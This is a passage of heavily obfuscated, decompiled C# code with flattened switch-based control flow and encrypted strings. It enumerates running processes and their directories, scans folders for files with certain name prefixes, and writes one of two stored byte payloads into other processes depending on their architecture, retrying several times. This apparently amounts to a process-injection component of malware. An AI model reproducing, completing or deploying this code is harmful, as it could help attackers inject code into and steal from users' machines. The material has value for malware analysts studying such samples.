						number122 = new number121 ();
						num = 1881971333;
						continue;
					case 0u:
						number123 = key9309 (number122, status747, list839);
						num = (int)((0 - num2) ^ 0x2FE4B579);
						continue;
					case 1u:
						return number122;
					}
					break;
				}
			}
		}

		private static List<string> amount51 (status423 text75)
		{
			List<string> list839 = new List<string> ();
			using IEnumerator<status423> enumerator = text75.level10.GetEnumerator ();
			FileInfo fileInfo = default(FileInfo);
			status423 current615 = default(status423);
			while (true) {
				int num = ((!enumerator.MoveNext ()) ? (-1460338403) : (-1110891509));
				while (true) {
					uint num2 = (uint)(num ^ -24237003);
					switch (num2 % 8) {
					case 7u:
						num = ~1110891508;
						continue;
					default:
						num = -1110891509;
						continue;
					case 4u:
						break;
					case 1u:
						fileInfo = current615.state3424 (flag6144.0e291526dfde44109a60e580c474e7dd ("8f8b7105ad9566755aa"));
						num = (fileInfo.Exists ? ((int)num2 + -755383841) : ((int)(~num2 ^ 0x7A24EA9F)));
						continue;
					case 2u:
						num = ((!current615.session9422 (flag6144.0e291526dfde44109a60e580c474e7dd ("50ce218b217b60d899d"))) ? ((int)(num2 + 568121167)) : ((int)num2 ^ -1653546874));
						continue;
					case 6u:
						current615 = enumerator.Current;
						num = ~1653043368;
						continue;
					case 3u:
						list839.Add (current615.path1429.Name);
						num = (int)((0 - num2) ^ 0x32CF7754);
						continue;
					case 5u:
						num = ((fileInfo.Length <= 0) ? ((int)num2 - -1481071916) : ((int)(0 - num2) + -470156365));
						continue;
					case 0u:
						return list839;
					}
					break;
				}
			}
		}

		private static List<string> key9309 (number121 status90, status423 range9788, List<string> level312)
		{
			List<string> list839 = new List<string> ();
			using IEnumerator<FileInfo> enumerator = range9788.rate98.GetEnumerator ();
			<>c__DisplayClass3_0 <>c__DisplayClass3_1 = default(<>c__DisplayClass3_0);
			input6339 input6341 = default(input6339);
			input6339 input6340 = default(input6339);
			while (true) {
				int num = ((!enumerator.MoveNext ()) ? (-1692876902) : (-153145590));
				while (true) {
					uint num2 = (uint)(num ^ -283193434);
					switch (num2 % 17) {
					case 11u:
						num = -153145590;
						continue;
					default:
						num = -153145590;
						continue;
					case 6u:
						num = (int)(<>c__DisplayClass3_1.file.Name.StartsWith (flag6144.0e291526dfde44109a60e580c474e7dd ("43994eb4e35b5c1db4620089c")) ? (0 - num2 + 1096854228) : (num2 - 1501546242));
						continue;
					case 1u:
						break;
					case 0u:
						num = ((<>c__DisplayClass3_1.file.Name.Length <= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bdab010a90977c6c4d6")) ? ((int)num2 + -1930430717) : ((int)num2 ^ -378612666));
						continue;
					case 9u:
						num = (int)((input6341 == null) ? ((0 - num2) ^ 0x22643957) : (num2 - 1681152063));
						continue;
					case 3u:
						status90.line32.Add (input6340);
						num = (int)num2 + -1089955548;
						continue;
					case 12u:
						num = ((!<>c__DisplayClass3_1.file.Name.StartsWith (flag6144.0e291526dfde44109a60e580c474e7dd ("1c9daf82448cf2d138abf56769a"))) ? ((int)num2 - -1601541058) : ((int)num2 + -1205275131));
						continue;
					case 10u:
						status90.line32.Add (input6341);
						num = (int)num2 ^ -503242806;
						continue;
					case 2u:
						<>c__DisplayClass3_1 = new <>c__DisplayClass3_0 ();
						num = -442494979;
						continue;
					case 13u:
						list839.Add (<>c__DisplayClass3_1.file.Name.Remove (<>c__DisplayClass3_1.file.Name.Length - flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9dd6c322be4fe57c64"), flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c913a2a837fb9134ecf")));
						input6340 = rate91.context9200 (<>c__DisplayClass3_1.file.FullName, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1c9d658f4fce6ce3ee0"));
						num = (int)(~num2 ^ 0x677301EC);
						continue;
					case 8u:
						num = (int)(~num2 ^ 0x24B97EDF);
						continue;
					case 4u:
						num = (<>c__DisplayClass3_1.file.Name.StartsWith (flag6144.0e291526dfde44109a60e580c474e7dd ("8d3eb5c123e58f94f19eefdd4dd")) ? ((int)num2 ^ -121623548) : ((int)num2 ^ -818419287));
						continue;
					case 15u:
						input6341 = rate91.context9200 (<>c__DisplayClass3_1.file.FullName, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9c0e4364ac0d27287c"));
						num = -1063807528;
						continue;
					case 14u:
						num = (int)((input6340 == null) ? (0 - num2 + 114502748) : (num2 - 950780784));
						continue;
					case 7u:
						<>c__DisplayClass3_1.file = enumerator.Current;
						num = (int)(~num2 ^ 0x499D3A9E);
						continue;
					case 16u:
						num = (level312.Any (<>c__DisplayClass3_1.index00) ? (-1975752076) : (~233661226));
						continue;
					case 5u:
						return list839;
					}
					break;
				}
			}
		}

		private static void min5500 (number121 id3854, status423 tree760, List<string> number18)
		{
			using List<string>.Enumerator enumerator = number18.GetEnumerator ();
			status423 status747 = default(status423);
			List<input6339> list839 = default(List<input6339>);
			<>c__DisplayClass4_0 <>c__DisplayClass4_1 = default(<>c__DisplayClass4_0);
			while (true) {
				int num = (enumerator.MoveNext () ? (~1483697144) : (-1243777211));
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num - -1583094710)) % 8) {
					case 7u:
						num = -1483697145;
						continue;
					default:
						num = -1483697145;
						continue;
					case 6u:
						id3854.id322.Add (new row9445 (status747.path1429, list839));
						num = (int)(~num2 ^ 0x2464DA3A);
						continue;
					case 2u:
						status747 = tree760.level10.FirstOrDefault (<>c__DisplayClass4_1.context319);
						num = (int)((status747 == null) ? (~num2 ^ 0x86C6B7E) : (num2 - 1253698664));
						continue;
					case 4u:
						<>c__DisplayClass4_1.normalizedName = enumerator.Current;
						num = (int)(~num2 ^ 0x54DC2C77);
						continue;
					case 5u:
						<>c__DisplayClass4_1 = new <>c__DisplayClass4_0 ();
						num = -1535427522;
						continue;
					case 1u:
						break;
					case 0u:
						list839 = (from fileInfo in status747.rate98
							select rate91.context9200 (fileInfo.FullName, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("afd8c2c68193607a865")) into input6340
							where input6340 != null
							select input6340).ToList ();
						num = ((list839.Count == 0) ? (-3984205) : (-973343296));
						continue;
					case 3u:
						return;
					}
					break;
				}
			}
		}

		private static List<settings7294> dir2299 ()
		{
			List<settings7294> list839 = new List<settings7294> ();
			using IEnumerator<status423> enumerator = new status423 (position291.graph9900, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e96adb868be54fe44e6")).level10.GetEnumerator ();
			string name = default(string);
			DirectoryInfo directoryInfo = default(DirectoryInfo);
			status423 current615 = default(status423);
			while (true) {
				int num = ((!enumerator.MoveNext ()) ? 114223574 : (--686429496));
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + 1184644363)) % 9) {
					case 8u:
						num = 686429496;
						continue;
					default:
						num = 686429496;
						continue;
					case 0u:
						list839.Add (new settings7294 (name, directoryInfo));
						num = (int)((0 - num2) ^ 0x329951C5);
						continue;
					case 5u:
						name = current615.path1429.Name;
						num = (int)(0 - num2 + 1772735087);
						continue;
					case 4u:
						current615 = enumerator.Current;
						num = 874538317;
						continue;
					case 3u:
						break;
					case 1u:
						num = ((!name.tree13 (flag6144.0e291526dfde44109a60e580c474e7dd ("9c3b1016461c1e90c7a348231e1"))) ? ((int)(0 - num2 + 874469061)) : ((int)num2 + -139439658));
						continue;
					case 7u:
						num = (directoryInfo.Exists ? ((int)num2 ^ -1931246073) : ((int)((0 - num2) ^ 0x60DEAADB)));
						continue;
					case 2u: {
						string fullName = current615.path1429.FullName;
						string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("68bd1f190bf3685db9c")];
						array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("4b08701151bf6871c697c217ce5fd9e");
						array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc73d9863293d8c5238")] = flag6144.0e291526dfde44109a60e580c474e7dd ("8e059ef4cfa689de7364112f1");
						array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9561754f3f13b9836d")] = flag6144.0e291526dfde44109a60e580c474e7dd ("c9ac5c96e450348ad32e98db9ef64a597bf9ad954fafd6bf796");
						array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8f09d3e32e975a6428c")] = flag6144.0e291526dfde44109a60e580c474e7dd ("77ab447a673ccd186b19e");
						directoryInfo = new DirectoryInfo (position151.child530 (fullName, array8361));
						num = (int)(num2 ^ 0x68CD937E);
						continue;
					}
					case 6u:
						return list839;
					}
					break;
				}
			}
		}

		private static List<settings7294> stack14 ()
		{
			List<settings7294> list839 = new List<settings7294> ();
			using List<Process>.Enumerator enumerator = output7884 ().GetEnumerator ();
			ProcessModule processModule = default(ProcessModule);
			Process current615 = default(Process);
			string path578 = default(string);
			string directoryName = default(string);
			while (true) {
				int num = (enumerator.MoveNext () ? (-1297349947) : (-338005545));
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num + 1649153830)) % 10) {
					case 0u:
						num = -1297349947;
						continue;
					default:
						num = -1297349947;
						continue;
					case 8u:
						break;
					case 2u:
						num = (int)((processModule == null) ? (num2 - 1519552784) : (~num2 ^ 0x3695957B));
						continue;
					case 3u:
						current615 = enumerator.Current;
						processModule = current615.start922 ();
						num = -1377875318;
						continue;
					case 9u:
						list839.Add (new settings7294 (current615.ProcessName, new DirectoryInfo (path578)));
						num = (int)(num2 - 1951292671);
						continue;
					case 7u:
						path578 = Path.Combine (directoryName, flag6144.0e291526dfde44109a60e580c474e7dd ("0f9e119e7bd13112b440f"));
						num = ((!Directory.Exists (path578)) ? ((int)num2 ^ -1625662951) : ((int)num2 ^ -317088576));
						continue;
					case 1u:
						directoryName = Path.GetDirectoryName (processModule.FileName);
						num = (int)((0 - num2) ^ 0x71EC1937);
						continue;
					case 6u:
						num = (string.IsNullOrEmpty (directoryName) ? ((int)num2 - -1999234668) : ((int)(~num2 ^ 0x9A76658)));
						continue;
					case 4u:
						num = (string.IsNullOrEmpty (processModule.FileName) ? ((int)num2 ^ -1911162118) : ((int)(num2 - 1269300153)));
						continue;
					case 5u:
						return list839;
					}
					break;
				}
			}
		}

		private static List<Process> output7884 ()
		{
			List<Process> list839 = new List<Process> ();
			try {
				Process[] processes = Process.GetProcesses ();
				int num3 = default(int);
				string processName = default(string);
				Process process = default(Process);
				while (true) {
					IL_000c:
					int num = -655181423;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(~num + -518722410)) % 10) {
						case 8u:
							break;
						default:
							num = -655181423;
							continue;
						case 2u:
							num3 = 0;
							num = (int)(0 - num2) ^ -2052328774;
							continue;
						case 1u:
							num = (int)num2 - -334658194;
							continue;
						case 6u:
							num = (processName.sum897 (flag6144.0e291526dfde44109a60e580c474e7dd ("42cc3a704aa6c0263f1039a719c")) ? ((int)num2 - -1414597120) : ((int)num2 ^ -2127722980));
							continue;
						case 7u:
							process = processes [num3];
							num = ~1740756043;
							continue;
						case 3u:
							processName = process.ProcessName;
							num = (string.IsNullOrEmpty (processName) ? ((int)((0 - num2) ^ 0x244744AB)) : ((int)num2 + -2047201780));
							continue;
						case 0u:
							num = ((num3 < processes.Length) ? (~1259784567) : (-1717292795));
							continue;
						case 5u:
							num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("5e518ea41d23dc8879d");
							num = -2104416031;
							continue;
						case 9u:
							list839.Add (process);
							num = (int)((0 - num2) ^ 0x16EE60A7);
							continue;
						case 4u:
							goto end_IL_0011;
						}
						goto IL_000c;
						continue;
						end_IL_0011:
						break;
					}
					break;
				}
			} catch {
			}
			return list839;
		}
	}
}
namespace left6656
{
	public class session20
	{
		private static string status3039 = string.Empty;

		private static string time7295;

		private static byte[] range7260;

		private static byte[] args402;

		public static void data8344 (width287 error016)
		{
			status3039 = error016.args76;
			time7295 = error016.column401;
			range7260 = error016.level90;
			args402 = error016.list8926;
		}

		public static void price56 ()
		{
			status3039 = string.Empty;
			while (true) {
				int num = -1798732385;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num ^ -490778250)) % 4) {
					case 3u:
						break;
					default:
						num = -1798732385;
						continue;
					case 1u:
						time7295 = string.Empty;
						num = (int)num2 - -1479974467;
						continue;
					case 2u:
						range7260 = new byte[0];
						num = (int)num2 ^ -967680184;
						continue;
					case 0u:
						args402 = new byte[0];
						return;
					}
					break;
				}
			}
		}

		public static node471 data38 (string right2907)
		{
			if (!string.IsNullOrEmpty (right2907)) {
				node471 result = default(node471);
				list47 list839 = default(list47);
				error759 error760 = default(error759);
				bool flag6146 = default(bool);
				string text873 = default(string);
				byte[] array8362 = default(byte[]);
				byte[] array8363 = default(byte[]);
				while (true) {
					int num = --890318578;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(-num + -1474643339)) % 7) {
						case 0u:
							break;
						default:
							num = 890318578;
							continue;
						case 2u:
							goto IL_0046;
						case 6u:
							return null;
						case 3u:
							goto IL_006d;
						case 1u:
							goto IL_008b;
						case 5u:
							goto end_IL_000b;
						case 4u:
							try {
								array8360.message891 message55 = stack564.array6147 (right2907);
								while (true) {
									IL_00c1:
									int num3 = 760411965;
									while (true) {
										switch ((num2 = (uint)((num3 ^ 0x53A691AB) - 1338296161)) % 7) {
										case 3u:
											break;
										default:
											num3 = 760411965;
											continue;
										case 6u:
											result = null;
											num3 = 643064340;
											continue;
										case 0u:
											num3 = (int)((message55.sum05 == 0) ? ((0 - num2) ^ 0x366A390) : (num2 - 1061634902));
											continue;
										case 1u:
											goto end_IL_00c6;
										case 2u:
											list839 = null;
											num3 = ~229501128;
											continue;
										case 4u:
											num3 = ((message55.next15 == IntPtr.Zero) ? ((int)num2 ^ -1064395288) : ((int)num2 - -36444298));
											continue;
										case 5u: {
											bool flag6145 = false;
											try {
												int? num4 = stack564.total02 (message55.next15);
												while (true) {
													IL_017b:
													int num5 = -257512389;
													while (true) {
														byte[] array8361;
														switch ((num2 = (uint)(num5 - 1908250445)) % 21) {
														case 8u:
															break;
														default:
															num5 = -257512389;
															continue;
														case 13u:
															array8361 = args402;
															goto IL_01fa;
														case 4u:
															error760.mode718 ();
															flag6146 = stack564.total02 (message55.next15).HasValue;
															num5 = (int)(0 - num2) + -315610988;
															continue;
														case 20u:
															result = null;
															num5 = (int)num2 - -723943178;
															continue;
														case 12u:
															error760 = new error759 ();
															text873 = flag6137 (message55.sum05, num4.Value, array8362);
															num5 = -1880891474;
															continue;
														case 14u:
															num5 = (int)(num4.HasValue ? (num2 - 168174374) : (num2 + 1518740861));
															continue;
														case 18u: {
															flag6146 = false;
															bool num6 = IntPtr.Size == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f9ca69a5a9e7de70cc3");
															bool flag6147 = num4.Value == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("69cd9f77d08e602c09d");
															num5 = ((num6 != flag6147) ? ((int)(~num2 ^ 0x769C5B4B)) : ((int)num2 + -1148398166));
															continue;
														}
														case 1u:
															num5 = (int)num2 ^ -1639046307;
															continue;
														case 11u:
															num5 = (flag6146 ? (~2032516274) : (-650653498));
															continue;
														case 17u:
															goto end_IL_0181;
														case 7u:
															if (num4.Value == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e91d3db0f6ec8a214cb")) {
																array8361 = range7260;
																goto IL_01fa;
															}
															num5 = -1778375209;
															continue;
														case 3u:
															error760.min33 (num4.Value);
															num5 = (int)(~num2 + 272121566);
															continue;
														case 6u:
															flag6146 = stack564.count97 (message55.next15, array8362, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8c875d10489c516b67b"));
															num5 = (int)(0 - num2 + 1384682837);
															continue;
														case 0u:
															error760.stack182 (text873);
															num5 = (int)(num2 + 680609517);
															continue;
														case 5u:
															result = null;
															num5 = (int)(~num2 ^ 0x4C86C013);
															continue;
														case 19u:
															goto end_IL_0181;
														case 10u:
															result = null;
															goto end_IL_0181;
														case 9u:
															array8362 = file2846 (array8363, list839.status320);
															num5 = (int)num2 - -609083627;
															continue;
														case 15u:
															num5 = (int)(string.IsNullOrEmpty (text873) ? (num2 - 1001736573) : (num2 - 1641644948));
															continue;
														case 16u:
															list839 = new list47 ();
															num5 = -638963807;
															continue;
														case 2u:
															{
																list839.key075 ();
																flag6145 = flag6144.09343d4890d2414f8aa92dc5c3eb3877 ("f9ebb46f42985");
																result = new node471 (list839, message55);
																goto end_IL_0181;
															}
															IL_01fa:
															array8363 = array8361;
															num5 = ((array8363.Length != 0) ? (-1845735247) : (~398013428));
															continue;
														}
														goto IL_017b;
														continue;
														end_IL_0181:
														break;
													}
													break;
												}
											} finally {
												if (!flag6145) {
													while (true) {
														IL_0433:
														int num7 = 383114478;
														while (true) {
															num2 = (uint)(num7 - -336501921);
															switch (num2 % 5) {
															case 2u:
																break;
															default:
																num7 = 383114478;
																continue;
															case 0u:
																message55.tree52 ();
																num7 = 1282228655;
																continue;
															case 3u:
																list839.source034 ();
																num7 = (int)(0 - num2) ^ -1360324595;
																continue;
															case 4u:
																num7 = (int)((list839 == null) ? (num2 ^ 0x68A65F97) : (num2 - 731665477));
																continue;
															case 1u:
																goto end_IL_0438;
															}
															goto IL_0433;
															continue;
															end_IL_0438:
															break;
														}
														break;
													}
												}
											}
											goto end_IL_00c6;
										}
										}
										goto IL_00c1;
										continue;
										end_IL_00c6:
										break;
									}
									break;
								}
							} catch {
								result = null;
							}
							return result;
						}
						break;
						IL_008b:
						num = (File.Exists (right2907) ? ((int)(0 - num2) + -1405775716) : ((int)num2 - -868842335));
						continue;
						IL_006d:
						num = (int)((args402.Length != 0) ? (num2 + 704056839) : (num2 - 180741336));
						continue;
						IL_0046:
						num = ((range7260.Length != 0) ? (--2094229108) : (--1430151688));
					}
					continue;
					end_IL_000b:
					break;
				}
			}
			return null;
		}

		public static byte[] dict307 (list47 state049, string cell4910, byte[] height678)
		{
			if (state049 != null) {
				while (true) {
					int num = 1229479628;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num - -42948161)) % 6) {
						case 3u:
							break;
						default:
							num = 1229479628;
							continue;
						case 1u:
							goto IL_0037;
						case 4u:
							goto end_IL_0003;
						case 2u:
							goto IL_005d;
						case 5u:
							goto IL_0075;
						case 0u:
							try {
								byte[] code = input83 (cell4910);
								return count190 (state049, code, height678);
							} catch {
								return null;
							}
						}
						break;
						IL_0075:
						num = ((height678.Length == 0) ? ((int)num2 + -928658946) : ((int)num2 - -626641328));
						continue;
						IL_005d:
						num = (int)((height678 != null) ? (num2 ^ 0xA489746) : (0 - num2 + 1485310165));
						continue;
						IL_0037:
						num = (string.IsNullOrEmpty (cell4910) ? ((int)(num2 - 886397156)) : ((int)num2 + -216096418));
					}
					continue;
					end_IL_0003:
					break;
				}
			}
			return null;
		}

		public static byte[] graph5474 (string mode13, byte[] output830)
		{
			if (!string.IsNullOrEmpty (mode13)) {
				byte[] array8362 = default(byte[]);
				byte[] array8361 = default(byte[]);
				while (true) {
					int num = -772363924;
					while (true) {
						uint num2 = (uint)(-num ^ 0x3C23E7C8);
						switch (num2 % 10) {
						case 6u:
							break;
						default:
							num = -772363924;
							continue;
						case 5u:
							return array8362;
						case 0u:
							goto IL_005c;
						case 3u:
							array8362 = queue310 (mode13, array8361, output830, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("76cb0752b234e19939e"));
							num = (int)((0 - num2) ^ 0x702FCC60);
							continue;
						case 1u:
							goto IL_00a1;
						case 2u:
							goto IL_00bb;
						case 9u:
							goto end_IL_000b;
						case 7u:
							goto IL_00e5;
						case 4u:
							goto IL_0107;
						case 8u:
							return source377 (mode13, array8361, output830);
						}
						break;
						IL_0107:
						num = ((output830 != null) ? ((int)(~num2 + 18166129)) : ((int)num2 ^ -2121851425));
						continue;
						IL_005c:
						num = ((IntPtr.Size == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("2d9dd0247a13480acd1")) ? ((int)(num2 + 2057761997)) : ((int)num2 ^ -334626700));
						continue;
						IL_00bb:
						num = ((output830.Length == 0) ? ((int)((0 - num2) ^ 0x4164CB5F)) : ((int)(~num2) + -678083624));
						continue;
						IL_00e5:
						array8361 = input83 (mode13);
						num = ((!data780.stack3101) ? (-377654316) : (-961582184));
						continue;
						IL_00a1:
						num = ((array8362 == null) ? ((int)(num2 - 642574367)) : ((int)num2 ^ -1342407340));
					}
					continue;
					end_IL_000b:
					break;
				}
			}
			return null;
		}

		private static byte[] queue310 (string position66, byte[] queue7445, byte[] temp7045, int limit952 = 3)
		{
			int num = 0;
			byte[] array8361 = default(byte[]);
			int? num6 = default(int?);
			byte[] result = default(byte[]);
			while (true) {
				IL_026a:
				array8360.message891 time99;
				if (num < limit952) {
					while (true) {
						time99 = name37 (position66, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1e9160acba94b7417ea"));
						if (time99.next15 == IntPtr.Zero) {
							break;
						}
						int num2 = -1816675065;
						while (true) {
							uint num3 = (uint)(num2 ^ -760984859);
							switch (num3 % 4) {
							case 0u:
								num2 = ~888816391;
								continue;
							default:
								num2 = -888816392;
								continue;
							case 1u:
								break;
							case 2u:
								goto IL_0064;
							case 3u:
								goto IL_0079;
							}
							break;
							IL_0064:
							if (time99.sum05 == 0) {
								goto end_IL_0036;
							}
							num2 = (int)(num3 - 2057527468);
						}
						continue;
						end_IL_0036:
						break;
					}
					goto IL_022e;
				}
				int num4 = 1864278624;
				goto IL_0241;
				IL_023b:
				num4 = ~-1427409094;
				goto IL_0241;
				IL_0241:
				while (true) {
					uint num3 = (uint)(num4 + -480397014);
					switch (num3 % 4) {
					case 0u:
						break;
					default:
						num4 = 1427409093;
						continue;
					case 3u:
						goto IL_026a;
					case 2u:
						return null;
					case 1u:
						goto end_IL_026a;
					}
					break;
				}
				goto IL_023b;
				IL_0079:
				list47 list839 = null;
				try {
					list839 = new list47 ();
					while (true) {
						IL_0081:
						int num5 = --2141731552;
						while (true) {
							uint num3;
							switch ((num3 = (uint)(num5 ^ 0x54ED3721)) % 11) {
							case 10u:
								break;
							default:
								num5 = 2141731552;
								continue;
							case 1u: {
								byte[] page = file2846 (range7260, list839.status320);
								num5 = ((!stack564.count97 (time99.next15, page, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c9499a8e02ffa202caa"))) ? ((int)(0 - num3) ^ -466807567) : ((int)(num3 ^ 0x4384234D)));
								continue;
							}
							case 7u:
								goto end_IL_0087;
							case 8u:
								array8361 = count190 (list839, queue7445, temp7045);
								num5 = (int)((array8361 == null) ? (num3 - 261649208) : (num3 ^ 0x84CC2B8));
								continue;
							case 9u:
								num6 = stack564.total02 (time99.next15);
								num5 = (int)(num3 + 817367402);
								continue;
							case 2u:
								num5 = (num6.HasValue ? ((int)(0 - num3) + -1904389836) : ((int)(0 - num3 + 1755380484)));
								continue;
							case 4u:
								list839.key075 ();
								num5 = --1762125244;
								continue;
							case 5u:
								num5 = ((array8361.Length == 0) ? ((int)(num3 - 855164831)) : ((int)(~num3) ^ -1418204589));
								continue;
							case 0u:
								throw new Exception ();
							case 6u:
								result = array8361;
								num5 = (int)(~num3) + -550616320;
								continue;
							case 3u:
								goto IL_022e;
							}
							goto IL_0081;
							continue;
							end_IL_0087:
							break;
						}
						break;
					}
				} catch {
					goto IL_022e;
				} finally {
					if (list839 != null) {
						goto IL_01e0;
					}
					goto IL_021f;
					IL_01e0:
					int num7 = ~1660172785;
					goto IL_01e6;
					IL_01e6:
					while (true) {
						uint num3 = (uint)(num7 + 1696416925);
						switch (num3 % 4) {
						case 2u:
							break;
						default:
							num7 = -1660172786;
							continue;
						case 3u:
							list839.source034 ();
							num7 = (int)(num3 ^ 0x1829E59C);
							continue;
						case 0u:
							goto IL_021f;
						case 1u:
							goto end_IL_01dd;
						}
						break;
					}
					goto IL_01e0;
					IL_021f:
					time99.tree52 ();
					num7 = ~-40660553;
					goto IL_01e6;
					end_IL_01dd:;
				}
				break;
				IL_022e:
				num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8e1ab0267f951e09b62");
				goto IL_023b;
				continue;
				end_IL_026a:
				break;
			}
			return result;
		}

		private static byte[] source377 (string current27, byte[] graph090, byte[] target08)
		{
			array8360.message891 time99 = name37 (current27, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1f98d5c50ff2b639d7c"));
			int? num4 = default(int?);
			byte[] result = default(byte[]);
			byte[] stack599 = default(byte[]);
			while (true) {
				int num = ~23487636;
				while (true) {
					uint num2 = (uint)((num ^ -1586834510) - -2372932);
					switch (num2 % 7) {
					case 6u:
						break;
					default:
						num = -23487637;
						continue;
					case 1u:
						return null;
					case 4u:
						num4 = stack564.total02 (time99.next15);
						num = (num4.HasValue ? (-795998021) : (-151862968));
						continue;
					case 2u:
						return null;
					case 5u:
						num = ((time99.sum05 == 0) ? ((int)num2 + -277232963) : ((int)num2 + -2103918024));
						continue;
					case 3u:
						num = ((time99.next15 == IntPtr.Zero) ? ((int)num2 ^ -1652994570) : ((int)(~num2 ^ 0x335269BA)));
						continue;
					case 0u: {
						list47 list839 = null;
						error759 error760 = new error759 ();
						try {
							list839 = new list47 ();
							while (true) {
								IL_00e9:
								int num3 = 793399254;
								while (true) {
									num2 = (uint)(~num3 + -1970518946);
									byte[] start8303;
									switch (num2 % 9) {
									case 8u:
										break;
									default:
										num3 = 793399254;
										continue;
									case 2u:
										result = count190 (list839, graph090, target08);
										num3 = (int)(0 - num2) ^ -1102416462;
										continue;
									case 4u:
										start8303 = args402;
										goto IL_014e;
									case 1u:
										if (num4.Value == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("60fdb866c21bc2b9a9e")) {
											start8303 = range7260;
											goto IL_014e;
										}
										num3 = (int)(~num2) + -2092977377;
										continue;
									case 0u:
										throw new Exception ();
									case 5u:
										list839.key075 ();
										num3 = --379303205;
										continue;
									case 6u:
										range1103 (error760, time99.sum05, num4.Value, stack599);
										num3 = (int)(num2 + 1075616953);
										continue;
									case 3u:
										num3 = (stack564.total02 (time99.next15).HasValue ? ((int)num2 - -1668351185) : ((int)num2 - -2110908847));
										continue;
									case 7u:
										goto end_IL_00ee;
										IL_014e:
										stack599 = file2846 (start8303, list839.status320);
										num3 = 1288836604;
										continue;
									}
									goto IL_00e9;
									continue;
									end_IL_00ee:
									break;
								}
								break;
							}
						} catch {
							result = null;
						} finally {
							error760.name4263 ();
							while (true) {
								IL_0207:
								int num5 = -704274375;
								while (true) {
									switch ((num2 = (uint)(num5 ^ -97922635)) % 5) {
									case 0u:
										break;
									default:
										num5 = -704274375;
										continue;
									case 2u:
										time99.tree52 ();
										num5 = ~1373331573;
										continue;
									case 4u:
										list839.source034 ();
										num5 = (int)num2 ^ -35450969;
										continue;
									case 1u:
										num5 = ((list839 == null) ? ((int)num2 + -1415791385) : ((int)(~num2) + -63938066));
										continue;
									case 3u:
										goto end_IL_020d;
									}
									goto IL_0207;
									continue;
									end_IL_020d:
									break;
								}
								break;
							}
						}
						return result;
					}
					}
					break;
				}
			}
		}

		private static array8360.message891 name37 (string message733, int format53 = 3)
		{
			int num = 0;
			array8360.message891 message734 = default(array8360.message891);
			array8360.message891 result = default(array8360.message891);
			while (true) {
				int num2 = 497191471;
				while (true) {
					uint num3 = (uint)(num2 + 523868600);
					switch (num3 % 10) {
					case 6u:
						break;
					default:
						num2 = 497191471;
						continue;
					case 1u:
						num2 = (int)num3 - -399480344;
						continue;
					case 8u:
						return message734;
					case 0u:
						result = default(array8360.message891);
						num2 = (int)(num3 ^ 0x47A5AAE6);
						continue;
					case 7u:
						message734.tree52 ();
						num += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1f958e7f346f371cfa8");
						num2 = ~-1420540416;
						continue;
					case 2u:
						num2 = ((!(message734.next15 != IntPtr.Zero)) ? ((int)(~num3) ^ -1374655974) : ((int)(0 - num3 + 1927760021)));
						continue;
					case 9u:
						num2 = ((message734.sum05 == 0) ? ((int)(0 - num3) + -1064339990) : ((int)num3 + -1350011821));
						continue;
					case 3u:
						message734 = stack564.array6147 (message733);
						num2 = ~57194617;
						continue;
					case 5u:
						num2 = ((num < format53) ? 1395602763 : (--702262940));
						continue;
					case 4u:
						return result;
					}
					break;
				}
			}
		}

		private static void range1103 (error759 balance39, int status778, int offset40, byte[] stack70)
		{
			string text873 = flag6137 (status778, offset40, stack70);
			int num3 = default(int);
			while (true) {
				int num = -487822139;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num - -1155411197)) % 5) {
					case 0u:
						break;
					default:
						num = -487822139;
						continue;
					case 4u:
						num3 = 0;
						goto IL_00ac;
					case 1u:
						throw new InvalidOperationException ();
					case 3u:
						num = ((!string.IsNullOrEmpty (text873)) ? ((int)num2 + -162167496) : ((int)(num2 - 145009269)));
						continue;
					case 2u:
						{
							try {
								balance39.min33 (offset40);
								balance39.stack182 (text873);
								balance39.mode718 ();
								return;
							} catch {
								balance39.name4263 ();
								if (num3 == flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("be1bb107ca9c687e8b5")) {
									throw;
								}
							}
							num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f95f96f437e6e616a6");
							goto IL_00ac;
						}
						IL_00ac:
						if (num3 >= flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bdf42e1d8a9ed3e653c")) {
							return;
						}
						goto case 2u;
					}
					break;
				}
			}
		}

		private static byte[] count190 (list47 graph91, byte[] code087, byte[] position5546)
		{
			if (!graph91.mode675 (code087, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc9c660a1b997a47798"))) {
				goto IL_0016;
			}
			goto IL_00f9;
			IL_0016:
			int num = ~-735647561;
			goto IL_001c;
			IL_001c:
			byte[] array8361 = default(byte[]);
			while (true) {
